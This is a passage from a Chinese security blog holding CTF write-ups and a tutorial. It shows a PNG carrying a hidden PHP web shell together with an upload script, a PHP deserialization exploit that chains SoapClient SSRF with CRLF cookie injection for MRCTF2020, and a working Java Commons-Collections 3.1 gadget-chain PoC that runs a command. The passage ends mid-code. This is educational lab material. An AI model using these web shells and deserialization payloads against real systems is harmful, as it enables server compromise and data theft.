<p>利用<a target="_blank" rel="noopener" href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">隐写工具</a>生成一个包含php代码的png文件，php代码为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a84bc5bd.jpg"></p>
<p>上传脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e0a5fbcf-c0bc-44e2-b258-a10f8553f7f3.node3.buuoj.cn/?ctf=upload&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;postedFile&#x27;</span>: <span class="string">&#x27;nginx&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;postedFile&#x27;</span>: <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, files=files,proxies=proxies)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>



<p>修改文件名中的i为unicode字符，同时添加绕过长宽限制的字符串</p>
<p><img src="https://www.hualigs.cn/image/60a35a849e152.jpg"></p>
<p>上传成功</p>
<p><img src="https://www.hualigs.cn/image/60a35a839f868.jpg"></p>
<p>在example.php解压文件</p>
<p><img src="https://www.hualigs.cn/image/60a35c434dd3c.jpg"></p>
<p>题目提示flag保存在/etc/中的多级目录下，递归访问一下即可</p>
<p><img src="https://www.hualigs.cn/image/60a35a83aa850.jpg"></p>
<p>拿到flag</p>
<p><img src="https://www.hualigs.cn/image/60a35a8314188.jpg"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-05-14T10:17:39.000Z" title="2021-05-14T10:17:39.000Z">2021-05-14</time>发表</span><span class="level-item"><time dateTime="2021-05-14T10:21:12.754Z" title="2021-05-14T10:21:12.754Z">2021-05-14</time>更新</span><span class="level-item">3 分钟读完 (大约450个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/14/MRCTF2020-EzpopRevenge/">MRCTF2020-EzpopRevenge</a></h1><div class="content"><p>一道挺有意思的ssrf+crlf+反序列化题</p>
<p>下载<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>/flag.php</p>
<p>看到<code>$_SERVER[&#39;REMOTE_ADDR&#39;]===&quot;127.0.0.1&quot;)</code>就知道和ssrf有关。满足条件后，flag会被保存到<code>$_SESSION[&#39;flag&#39;]</code>中</p>
<p><img src="https://www.hualigs.cn/image/609e4e9c185ab.jpg"></p>
<h1 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h1><p>/usr/plugins/HelloWorld/Plugin/Plugin.php</p>
<p>反序列化点，对序列化字符串进行了过滤。并且当存在<code>$_REQUEST[&#39;admin&#39;]</code>时，显示<code>$_SESSION</code></p>
<p><img src="https://www.hualigs.cn/image/609e4e9c78cf8.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C0incid3nc3</span><br></pre></td></tr></table></figure>



<p>/var/Typecho/Plugin.php</p>
<p><img src="https://www.hualigs.cn/image/609e4e9d5a041.jpg"></p>
<h1 id="反序列化SoapClient类"><a href="#反序列化SoapClient类" class="headerlink" title="反序列化SoapClient类"></a>反序列化SoapClient类</h1><p>反序列化SoapClient类并调用<code>__call</code>方法可以触发ssrf</p>
<p>/var/Typecho/Plugin.php</p>
<p>在HelloWorld_DB类的__wakeup方法中实例化了一个<code>Typecho_Db类</code></p>
<p><img src="https://www.hualigs.cn/image/609e4e9c9739c.jpg"></p>
<p>/var/Typecho/Db.php#Typecho_Db</p>
<p><code>Typecho_Db类</code>的构造方法，可以看到提示<code>__toString()</code>，传入参数<code>$adapterName</code>被当作字符串拼接，接下来需要找到符合条件的类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存在__toString()</span><br><span class="line">__toString中存在可以触发SoapClient::__call的语句</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/609e4e9cc16d8.jpg"></p>
<p>/var/Typecho/Db/Query.php#Typecho_Db_Query</p>
<p><code>Typecho_Db_Query类</code>符合要求。首先满足条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;_sqlPreBuild[&#39;action&#39;]&#x3D;&#39;SELECT&#39;</span><br></pre></td></tr></table></figure>

<p>然后让<code>$this-&gt;_adapter</code>等于<code>SoapClient类</code>，接着调用不存在的方法<code>parseSelect</code>触发<code>__call</code>请求flag.php</p>
<p><img src="https://www.hualigs.cn/image/609e4e9d6fed1.jpg"></p>
<h1 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h1><p>由于SoapClient类无法传入Cookie参数，所以这里在user_agent这里加入换行符（\r\n）来构造出cookie参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=[<span class="string">&#x27;hello&#x27;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]=<span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=5j1i9n0jol3vdbpg4m3svbp3n7&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;123&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;str_replace(<span class="string">&quot;^^&quot;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="string">&#x27;saaaaaa^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>



<p>拿到flag</p>
<p><img src="https://www.hualigs.cn/image/609e4e9d64733.jpg"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-30T08:29:19.000Z" title="2021-04-30T08:29:19.000Z">2021-04-30</time>发表</span><span class="level-item"><time dateTime="2021-04-30T08:38:14.177Z" title="2021-04-30T08:38:14.177Z">2021-04-30</time>更新</span><span class="level-item">26 分钟读完 (大约3861个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/">java反序列化学习-CommonsCollections3.1</a></h1><div class="content"><h1 id="commons-collections-3-1"><a href="#commons-collections-3-1" class="headerlink" title="commons-collections-3.1"></a>commons-collections-3.1</h1><p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p>
<p>漏洞存在版本为3.1</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="poc执行过程"><a href="#poc执行过程" class="headerlink" title="poc执行过程"></a>poc执行过程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>调用栈</p>
<p><img src="https://www.hualigs.cn/image/608bc02ed0544.jpg"></p>
<p><code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#setValue</code></p>
<p>首先进入<code>setValue</code>，调用了<code>checkSetValue</code></p>
<p><img src="https://www.hualigs.cn/image/608bc02f567b5.jpg"></p>
<p><code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code></p>
<p><code>this.valueTransformer</code>等于<code>ChainedTransformer</code>类，调用了<code>ChainedTransformer</code>类中的<code>transform</code>方法</p>
<p><img src="https://www.hualigs.cn/image/608bc02f6263e.jpg"></p>
<p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p>
<p><img src="https://www.hualigs.cn/image/608bc02f6f7cb.jpg"></p>
<p>根据<code>this.iTransformers</code>数组的值可以知道，第一次进入的是<code>ConstantTransformer</code>类的<code>transform</code>方法，后三次进入的是<code>InvokerTransformer</code>类的<code>transform</code>。<code>transform</code>的返回值会作为下个<code>transform</code>函数的参数，</p>
<p><img src="https://www.hualigs.cn/image/608bc030336bd.jpg"></p>
<p>看一下<code>ChainedTransformer</code>的构造函数，可以发现<code>this.iTransformers</code>可控</p>
<p><img src="https://www.hualigs.cn/image/608bc03236f07.jpg"></p>
<p><code>org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer</code></p>
<p>第一次进入的<code>transform</code></p>
<p><img src="https://www.hualigs.cn/image/608bc0300ee48.jpg"></p>
<p><code>org.apache.commons.collections.functors.InvokerTransformer#transform</code></p>
<p>后三次进入<code>InvokerTransformer</code>的<code>Transformer</code>方法，这里存在反射调用，参数可控。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setValue()-&gt;</span><br><span class="line">checkSetvalue()-&gt;</span><br><span class="line">&#96;ChainedTransformer&#96;类中的&#96;transform&#96;方法-&gt;</span><br><span class="line">四次循环，第一次进入ConstantTransformer的transform，后三次进入InvokerTransformer的transform-&gt;</span><br><span class="line">触发反射</span><br></pre></td></tr></table></figure>



<h1 id="反射链"><a href="#反射链" class="headerlink" title="反射链"></a>反射链</h1><p><code>org.apache.commons.collections.functors.InvokerTransformer#transform</code></p>
<p>这里实现了反射调用，如果<code>input</code>等于<code>Runtime类</code>，那么<code>input.getClass</code>获取到的是<code>java.lang.class</code>，无法获取到方法，必须让<code>input</code>等于<code>Runtime实例</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//input必须为Runtime的实例，cls才会等于Runtime类，</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//this.iMethodName等于exec，this.iParamTypes等于String.class</span></span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="comment">//this.Args为要执行的命令</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); </span><br><span class="line">            &#125; </span><br><span class="line">           .........</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看一下构造函数，三个属性都是传入参数</p>
<p><img src="https://www.hualigs.cn/image/608bc02f7cc33.jpg"></p>
<p>参考反射命令执行代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">                .getMethod(<span class="string">&quot;exec&quot;</span>, String.class)</span><br><span class="line">                .invoke(                        Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))</span><br><span class="line">                        ,</span><br><span class="line">                        <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line">                );</span><br></pre></td></tr></table></figure>

<p>需要满足以下条件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.iMethodName=“exec”</span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line">input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>



<p>尝试尝试构造执行命令</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608bc034d2af5.jpg"></p>
<p>可以成功执行，但是还存在一个问题就是无法传入<code>Runtime</code>的实例对象。</p>
<h2 id="两种获取Runtime实例的错误思路"><a href="#两种获取Runtime实例的错误思路" class="headerlink" title="两种获取Runtime实例的错误思路"></a>两种获取Runtime实例的错误思路</h2><p>用readObject模拟反序列化</p>
<p>序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造InvokerTransformer</span></span><br><span class="line">        InvokerTransformer a=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        FileOutputStream f=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout=<span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造传入transform的参数，Runtime实例</span></span><br><span class="line">        Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fi=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin=<span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        InvokerTransformer b=(InvokerTransformer) fin.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞，调用transform，input为传入参数</span></span><br><span class="line">        b.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反序列化</p>
<p>可以看到存在一个问题，必须给<code>transform</code>传入一个构造好的Runtime实例也就是<code>input</code>才可以触发漏洞，实际环境里不可能有这样一个构造好的实例，那么能否利用反序列化给<code>transform</code>传入Runtime实例呢？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serial</span> <span class="keyword">implements</span> <span class="title">Serializable</span>  </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 